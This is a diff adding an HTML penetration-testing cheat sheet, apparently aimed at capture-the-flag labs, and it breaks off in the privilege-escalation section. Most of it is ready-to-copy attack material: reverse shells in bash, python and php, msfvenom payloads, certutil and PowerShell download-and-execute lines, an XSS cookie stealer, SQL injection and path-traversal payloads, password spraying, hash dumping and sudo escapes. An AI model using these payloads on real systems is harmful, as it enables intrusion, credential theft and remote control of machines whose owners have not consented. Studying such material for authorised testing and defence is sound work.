@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    .cs-search-wrap { position:relative; margin-bottom:24px; }
+    .cs-search-wrap input { width:100%; background:var(--surface); border:1px solid var(--border); border-radius:7px; padding:10px 14px 10px 38px; font-family:var(--mono); font-size:12px; color:var(--text); outline:none; transition:border-color .15s; }
+    .cs-search-wrap input::placeholder { color:var(--muted); }
+    .cs-search-wrap input:focus { border-color:rgba(57,211,83,.5); }
+    .cs-search-ico { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:var(--muted); pointer-events:none; font-size:15px; }
+    .cs-match-count { font-family:var(--mono); font-size:11px; color:var(--muted); margin-bottom:24px; }
+    .cs-match-count span { color:var(--green); }
+
+    .cs-category { margin-bottom:48px; scroll-margin-top:70px; }
+    .cs-cat-hdr { display:flex; align-items:center; gap:14px; margin-bottom:18px; padding-bottom:10px; border-bottom:1px solid var(--border); }
+    .cs-cat-num { font-family:var(--mono); font-size:11px; font-weight:700; padding:3px 11px; border-radius:5px; border:1px solid; text-transform:uppercase; letter-spacing:.04em; }
+    .cs-cat-title { font-family:var(--mono); font-size:17px; font-weight:500; color:var(--text); }
+    .cs-cat-meta { margin-left:auto; font-family:var(--mono); font-size:11px; color:var(--muted); }
+
+    .cs-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(400px,1fr)); gap:12px; }
+
+    .cs-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px; overflow:hidden; transition:border-color .15s; }
+    .cs-card:hover { border-color:var(--surface2); }
+    .cs-card.hidden { display:none; }
+
+    .cs-card-hdr { background:var(--surface); padding:10px 14px; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; }
+    .cs-card-title { font-family:var(--mono); font-size:12px; font-weight:500; color:var(--text); }
+    .cs-card-tags { display:flex; gap:5px; }
+
+    .cs-card-body { padding:10px 12px; display:flex; flex-direction:column; gap:6px; }
+
+    .cl { background:var(--surface2); border-radius:5px; padding:7px 11px; font-family:var(--mono); font-size:12px; color:var(--muted); display:flex; align-items:flex-start; gap:8px; cursor:pointer; transition:all .15s; border:1px solid transparent; position:relative; }
+    .cl:hover { background:var(--surface); border-color:var(--border); color:var(--text); }
+    .cl .dollar { color:var(--green); flex-shrink:0; line-height:1.6; }
+    .cl .ct { flex:1; line-height:1.6; word-break:break-all; }
+    .cl .desc { display:block; font-size:10px; color:var(--muted); margin-top:3px; font-style:italic; }
+    .cl .hint { font-size:10px; color:var(--muted); opacity:0; transition:opacity .15s; flex-shrink:0; padding-top:2px; }
+    .cl:hover .hint { opacity:1; }
+    .cl.copied { border-color:rgba(57,211,83,.4); background:rgba(57,211,83,.05); }
+
+    .kw  { color:var(--accent); }
+    .flg { color:var(--purple); }
+    .arg { color:var(--orange); }
+    .tgt { color:var(--yellow); }
+    .str { color:var(--green); }
+    .cm  { color:#3d4450; font-style:italic; }
+
+    .cs-tip  { background:rgba(57,211,83,.06); border:1px solid rgba(57,211,83,.2); border-radius:6px; padding:9px 13px; font-family:var(--mono); font-size:11px; color:var(--muted); line-height:1.7; margin-top:4px; }
+    .cs-tip strong { color:var(--green); }
+    .cs-warn { background:rgba(255,166,87,.06); border:1px solid rgba(255,166,87,.2); border-radius:6px; padding:9px 13px; font-family:var(--mono); font-size:11px; color:var(--muted); line-height:1.7; margin-top:4px; }
+    .cs-warn strong { color:var(--orange); }
+
+    .no-res { text-align:center; padding:60px 20px; font-family:var(--mono); color:var(--muted); display:none; }
+
+    /* sidebar jump links */
+    .sb-jump { padding:13px 10px 6px; border-top:1px solid var(--border); }
+    .sb-jump-lbl { font-family:var(--mono); font-size:10px; color:var(--muted); letter-spacing:.12em; text-transform:uppercase; padding:0 8px; margin-bottom:5px; }
+    .sb-jump-item { display:flex; align-items:center; gap:8px; padding:6px 10px; border-radius:5px; font-family:var(--mono); font-size:11px; color:var(--muted); text-decoration:none; transition:all .15s; }
+    .sb-jump-item:hover { background:var(--surface); color:var(--text); }
+    .sb-jump-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <div class="cs-search-wrap">
+    <span class="cs-search-ico">⌕</span>
+    <input id="cs-q" type="text" placeholder="search commands, tools, techniques..." autocomplete="off" spellcheck="false">
+  </div>
+  <div class="cs-match-count">showing <span id="cs-count">—</span> commands</div>
+
+  <!-- ═══════ 01 RECON ═══════ -->
+  <div class="cs-category" id="cs-recon">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-blue">01</span>
+      <span class="cs-cat-title">Recon &amp; Scanning</span>
+      <span class="cs-cat-meta">nmap · gobuster · ffuf · whatweb</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Nmap — Essential Scans</span><div class="cs-card-tags"><span class="tag tag-blue">nmap</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-sC -sV -oN</span> <span class="arg">scan.txt</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">default scripts + version, save output</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-p- --min-rate</span> <span class="arg">5000</span> <span class="flg">-T4</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">all 65535 ports, fast</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-sU --top-ports</span> <span class="arg">100</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">UDP top 100</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-sV --script</span> <span class="arg">vuln</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">vulnerability detection scripts</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-Pn -sV -sC -p</span> <span class="arg">22,80,443,445,5985</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">no ping, targeted ports</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nmap</span> <span class="flg">-sn</span> <span class="tgt">10.10.10.0/24</span><span class="desc">ping sweep / host discovery</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>tip:</strong> do full port scan first (<span style="color:var(--accent)">-p-</span>), then version scan only open ports for speed</div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Dir / Vhost Bruteforce</span><div class="cs-card-tags"><span class="tag tag-orange">gobuster</span><span class="tag tag-blue">ffuf</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">gobuster</span> dir <span class="flg">-u</span> <span class="tgt">http://&lt;IP&gt;</span> <span class="flg">-w</span> <span class="arg">common.txt</span><span class="desc">basic dir scan</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">gobuster</span> dir <span class="flg">-u</span> <span class="tgt">http://&lt;IP&gt;</span> <span class="flg">-w</span> <span class="arg">raft-medium.txt</span> <span class="flg">-x</span> <span class="arg">php,html,txt,bak</span><span class="desc">with extensions</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">gobuster</span> vhost <span class="flg">-u</span> <span class="tgt">http://target.htb</span> <span class="flg">-w</span> <span class="arg">subdomains.txt</span> <span class="flg">--append-domain</span><span class="desc">vhost enum</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ffuf</span> <span class="flg">-w</span> <span class="arg">subdomains.txt</span> <span class="flg">-u</span> <span class="tgt">http://FUZZ.target.htb</span> <span class="flg">-fs</span> <span class="arg">0</span><span class="desc">subdomain fuzz, filter empty</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ffuf</span> <span class="flg">-w</span> <span class="arg">params.txt</span> <span class="flg">-u</span> <span class="tgt">'http://target/page?FUZZ=val'</span><span class="desc">GET param fuzzing</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">feroxbuster</span> <span class="flg">-u</span> <span class="tgt">http://&lt;IP&gt;</span> <span class="flg">-w</span> <span class="arg">common.txt</span> <span class="flg">--depth</span> <span class="arg">3</span><span class="desc">recursive scan</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">DNS &amp; Fingerprinting</span><div class="cs-card-tags"><span class="tag tag-teal">dns</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">dig</span> ANY <span class="tgt">target.htb</span> @<span class="tgt">&lt;IP&gt;</span><span class="desc">all DNS records</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">dig</span> axfr <span class="tgt">target.htb</span> @<span class="tgt">&lt;IP&gt;</span><span class="desc">zone transfer</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">whatweb</span> <span class="flg">-a 3</span> <span class="tgt">http://&lt;IP&gt;</span><span class="desc">aggressive web fingerprint</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nikto</span> <span class="flg">-h</span> <span class="tgt">http://&lt;IP&gt;</span><span class="desc">web vuln scan</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">curl</span> <span class="flg">-I</span> <span class="tgt">http://&lt;IP&gt;</span><span class="desc">grab HTTP headers</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 02 WEB ═══════ -->
+  <div class="cs-category" id="cs-web">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-orange">02</span>
+      <span class="cs-cat-title">Web Exploitation</span>
+      <span class="cs-cat-meta">SQLi · LFI · XSS · SSRF · upload</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">SQL Injection</span><div class="cs-card-tags"><span class="tag tag-red">SQLi</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">sqlmap</span> <span class="flg">-u</span> <span class="tgt">'http://target/?id=1'</span> <span class="flg">--dbs</span><span class="desc">enumerate databases</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">sqlmap</span> <span class="flg">-u</span> <span class="tgt">URL</span> <span class="flg">-D</span> <span class="arg">db</span> <span class="flg">-T</span> <span class="arg">users</span> <span class="flg">--dump</span><span class="desc">dump table</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">sqlmap</span> <span class="flg">-r</span> <span class="arg">req.txt</span> <span class="flg">--level 5 --risk 3</span><span class="desc">from Burp request file</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">sqlmap</span> <span class="flg">-u</span> <span class="tgt">URL</span> <span class="flg">--os-shell</span><span class="desc">attempt OS shell via SQLi</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>manual:</strong> <span style="color:var(--orange)">' OR 1=1-- -</span> &nbsp;|&nbsp; <span style="color:var(--orange)">' AND SLEEP(5)-- -</span> &nbsp;|&nbsp; <span style="color:var(--orange)">' UNION SELECT null,null-- -</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">LFI / Path Traversal</span><div class="cs-card-tags"><span class="tag tag-red">LFI</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">?page=../../../../etc/passwd</span><span class="desc">basic traversal</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">?page=....//....//....//etc/passwd</span><span class="desc">filter bypass</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">?page=php://filter/convert.base64-encode/resource=index.php</span><span class="desc">read PHP source</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">?page=../../../../windows/system32/drivers/etc/hosts</span><span class="desc">Windows target</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">?page=\\&lt;ATTACKER&gt;\share\x</span><span class="desc">UNC → NTLMv2 capture</span></span><span class="hint">copy</span></div>
+          <div class="cs-warn"><strong>rce via LFI:</strong> try /proc/self/environ, access.log poison, or SSH auth.log</div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">File Upload Bypass</span><div class="cs-card-tags"><span class="tag tag-red">upload</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="arg">shell.php</span> → <span class="arg">shell.pHp / shell.php5 / shell.phtml</span><span class="desc">case/alt extension bypass</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="arg">shell.php</span> → <span class="arg">shell.php.jpg</span><span class="desc">double extension</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct">Content-Type: <span class="str">image/jpeg</span> <span class="cm"># swap in Burp</span><span class="desc">MIME type bypass</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">exiftool</span> <span class="flg">-Comment</span>=<span class="str">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> <span class="arg">img.jpg</span><span class="desc">PHP in image metadata</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">XSS &amp; SSRF</span><div class="cs-card-tags"><span class="tag tag-yellow">XSS</span><span class="tag tag-teal">SSRF</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="str">&lt;script&gt;fetch('http://&lt;IP&gt;/?c='+document.cookie)&lt;/script&gt;</span><span class="desc">cookie stealer</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="str">&lt;img src=x onerror=this.src='http://&lt;IP&gt;/?'+btoa(document.cookie)&gt;</span><span class="desc">img tag XSS</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">http://169.254.169.254/latest/meta-data/</span><span class="desc">SSRF → AWS metadata</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="tgt">http://localhost:&lt;port&gt;/admin</span><span class="desc">SSRF → internal services</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">nc</span> <span class="flg">-lvnp</span> <span class="arg">80</span> <span class="cm"># catch XSS/SSRF requests</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 03 SMB/AD ═══════ -->
+  <div class="cs-category" id="cs-ad">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-yellow">03</span>
+      <span class="cs-cat-title">SMB / Active Directory</span>
+      <span class="cs-cat-meta">impacket · crackmapexec · bloodhound · kerbrute</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">SMB Enumeration</span><div class="cs-card-tags"><span class="tag tag-yellow">SMB</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">smbclient</span> <span class="flg">-L</span> <span class="tgt">//&lt;IP&gt;</span> <span class="flg">-N</span><span class="desc">list shares (null auth)</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">smbclient</span> <span class="tgt">//&lt;IP&gt;/share</span> <span class="flg">-U</span> <span class="arg">user</span><span class="desc">connect to share</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">crackmapexec</span> smb <span class="tgt">&lt;IP&gt;</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">pass</span> <span class="flg">--shares</span><span class="desc">list shares authed</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">crackmapexec</span> smb <span class="tgt">&lt;IP&gt;</span> <span class="flg">-u</span> <span class="arg">users.txt</span> <span class="flg">-p</span> <span class="arg">'Pass123!'</span> <span class="flg">--continue-on-success</span><span class="desc">spray</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">enum4linux-ng</span> <span class="flg">-A</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">full enum (users, shares, policies)</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">smbmap</span> <span class="flg">-H</span> <span class="tgt">&lt;IP&gt;</span> <span class="flg">-u</span> <span class="arg">anonymous</span><span class="desc">check permissions</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Kerberos Attacks</span><div class="cs-card-tags"><span class="tag tag-orange">Kerberoast</span><span class="tag tag-red">AS-REP</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">kerbrute</span> userenum <span class="flg">-d</span> <span class="tgt">domain.local</span> <span class="flg">--dc</span> <span class="tgt">&lt;IP&gt;</span> <span class="arg">users.txt</span><span class="desc">validate usernames</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-GetUserSPNs</span> <span class="tgt">domain/user:pass</span> <span class="flg">-dc-ip</span> <span class="tgt">&lt;IP&gt;</span> <span class="flg">-request</span><span class="desc">Kerberoasting</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-GetNPUsers</span> <span class="tgt">domain/</span> <span class="flg">-usersfile</span> <span class="arg">users.txt</span> <span class="flg">-dc-ip</span> <span class="tgt">&lt;IP&gt;</span><span class="desc">AS-REP roasting</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-secretsdump</span> <span class="tgt">domain/user:pass@&lt;IP&gt;</span><span class="desc">dump hashes</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">evil-winrm</span> <span class="flg">-i</span> <span class="tgt">&lt;IP&gt;</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">pass</span><span class="desc">WinRM shell</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">evil-winrm</span> <span class="flg">-i</span> <span class="tgt">&lt;IP&gt;</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-H</span> <span class="arg">&lt;NTLM-hash&gt;</span><span class="desc">pass-the-hash</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">BloodHound Collection</span><div class="cs-card-tags"><span class="tag tag-red">BloodHound</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">bloodhound-python</span> <span class="flg">-d</span> <span class="tgt">domain.local</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">pass</span> <span class="flg">-ns</span> <span class="tgt">&lt;IP&gt;</span> <span class="flg">-c all</span><span class="desc">collect all</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ldapsearch</span> <span class="flg">-x -H</span> <span class="tgt">ldap://&lt;IP&gt;</span> <span class="flg">-b</span> <span class="arg">'DC=domain,DC=local'</span><span class="desc">LDAP anon enum</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>cypher:</strong> MATCH (u:User {owned:true})-[r:MemberOf|AdminTo*1..]->(g:Group) RETURN u,r,g</div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">NTLMv2 Capture</span><div class="cs-card-tags"><span class="tag tag-purple">responder</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">responder</span> <span class="flg">-I</span> <span class="arg">tun0</span> <span class="flg">-rdw</span><span class="desc">LLMNR/NBT-NS poisoning</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 5600</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span><span class="desc">crack NTLMv2</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">hashcat</span> <span class="flg">-m 1000</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span><span class="desc">crack NTLM</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>trigger:</strong> inject <span style="color:var(--orange)">\\&lt;IP&gt;\share</span> via LFI, XSS, or UNC path to capture without LLMNR</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 04 SHELLS ═══════ -->
+  <div class="cs-category" id="cs-shells">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-red">04</span>
+      <span class="cs-cat-title">Shells &amp; Payloads</span>
+      <span class="cs-cat-meta">revshells · stabilization · msfvenom</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Reverse Shells — Linux</span><div class="cs-card-tags"><span class="tag tag-red">revshell</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">rlwrap nc</span> <span class="flg">-lvnp</span> <span class="arg">4444</span><span class="desc">listener (rlwrap = arrow keys)</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">bash</span> <span class="flg">-c</span> <span class="str">'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1'</span><span class="desc">bash TCP</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">python3</span> <span class="flg">-c</span> <span class="str">"import os,pty,socket;s=socket.socket();s.connect(('&lt;IP&gt;',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"</span><span class="desc">python3</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">php</span> <span class="flg">-r</span> <span class="str">'$s=fsockopen("&lt;IP&gt;",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span class="desc">PHP</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">nc</span> <span class="tgt">&lt;IP&gt;</span> <span class="arg">4444</span> | /bin/bash | <span class="kw">nc</span> <span class="tgt">&lt;IP&gt;</span> <span class="arg">4445</span><span class="desc">nc without -e</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Shell Stabilization (TTY)</span><div class="cs-card-tags"><span class="tag tag-teal">TTY</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">python3</span> <span class="flg">-c</span> <span class="str">'import pty;pty.spawn("/bin/bash")'</span><span class="desc">step 1: upgrade to PTY</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct">Ctrl+Z → <span class="kw">stty</span> raw <span class="flg">-echo</span>; <span class="kw">fg</span><span class="desc">step 2: raw mode</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">export</span> <span class="arg">TERM=xterm</span>; <span class="kw">stty</span> rows <span class="arg">50</span> columns <span class="arg">200</span><span class="desc">step 3: fix terminal size</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>alternative:</strong> use <span style="color:var(--accent)">socat</span> for fully interactive TTY from the start — cleaner</div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Windows Payloads</span><div class="cs-card-tags"><span class="tag tag-orange">Windows</span><span class="tag tag-purple">msfvenom</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">msfvenom</span> <span class="flg">-p</span> <span class="arg">windows/x64/shell_reverse_tcp</span> LHOST=<span class="tgt">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> <span class="flg">-f exe -o</span> <span class="arg">shell.exe</span><span class="desc">x64 exe</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">msfvenom</span> <span class="flg">-p</span> <span class="arg">windows/x64/shell_reverse_tcp</span> LHOST=<span class="tgt">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> <span class="flg">-f aspx -o</span> <span class="arg">shell.aspx</span><span class="desc">ASPX</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">certutil</span> <span class="flg">-urlcache -f</span> <span class="tgt">http://&lt;IP&gt;/shell.exe</span> <span class="arg">shell.exe</span><span class="desc">download via certutil</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">powershell</span> <span class="str">"IEX(New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;/shell.ps1')"</span><span class="desc">PS download+exec</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══════ 05 PRIVESC ═══════ -->
+  <div class="cs-category" id="cs-privesc">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-purple">05</span>
+      <span class="cs-cat-title">Privilege Escalation</span>
+      <span class="cs-cat-meta">linpeas · winpeas · GTFOBins · SUID</span>
+    </div>
+    <div class="cs-grid">
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">Linux Enum</span><div class="cs-card-tags"><span class="tag tag-green">Linux</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">sudo</span> <span class="flg">-l</span><span class="desc">what can we sudo?</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">find</span> / <span class="flg">-perm -u=s -type f</span> 2>/dev/null<span class="desc">SUID binaries</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">cat</span> /etc/crontab; <span class="kw">ls</span> /etc/cron*<span class="desc">cron jobs</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">ss</span> <span class="flg">-tulnp</span><span class="desc">listening ports (internal services)</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">curl</span> <span class="tgt">http://&lt;IP&gt;/linpeas.sh</span> | bash<span class="desc">run LinPEAS</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar">$</span><span class="ct"><span class="kw">cat</span> /etc/passwd | <span class="kw">grep</span> <span class="str">bash</span><span class="desc">users with shells</span></span><span class="hint">copy</span></div>
+        </div>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-card-hdr"><span class="cs-card-title">GTFOBins Escapes</span><div class="cs-card-tags"><span class="tag tag-red">sudo</span><span class="tag tag-orange">SUID</span></div></div>
+        <div class="cs-card-body">
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="cm"># vim</span></span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">sudo vim</span> <span class="flg">-c</span> <span class="str">':!/bin/bash'</span><span class="desc">vim escape</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="cm"># find (SUID)</span></span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">find</span> . <span class="flg">-exec</span> /bin/bash <span class="flg">-p</span> \;<span class="desc">SUID find escape</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="cm"># python / awk / nmap</span></span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">sudo python3</span> <span class="flg">-c</span> <span class="str">'import os;os.system("/bin/bash")'</span><span class="desc">python escape</span></span><span class="hint">copy</span></div>
+          <div class="cl"><span class="dollar"> </span><span class="ct"><span class="kw">sudo awk</span> <span class="str">'BEGIN{system("/bin/bash")}'</span><span class="desc">awk escape</span></span><span class="hint">copy</span></div>
+          <div class="cs-tip"><strong>gtfobins.github.io</strong> — escape techniques for every binary</div>
+        </div>
+      </div>
+
+      <div class="cs-card">
